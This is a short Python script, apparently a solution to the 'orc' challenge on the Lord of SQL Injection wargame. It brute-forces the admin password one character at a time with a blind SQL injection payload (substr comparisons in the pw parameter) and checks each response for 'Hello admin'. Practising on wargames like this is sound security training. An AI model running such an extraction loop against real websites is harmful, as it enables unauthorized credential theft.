#!/usr/bin/py
#-*-coding:utf-8 -*-

import requests

pw=""

for i in range(1,9):
  for j in range(33,128): # ascii code로 변환할 chr() 함수로 전달할 파라미터 값
    try:
      url="https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and substr(pw, " + str(i) + ", 1)='" + chr(j)
      result = requests.post(url, cookies=(dict(PHPSESSID="세션값")))
    except:
      print("Error...")
      continue
    if 'Hello admin' in result.text:
      pw = pw + chr(j)
      print("pw : " + pw)
      break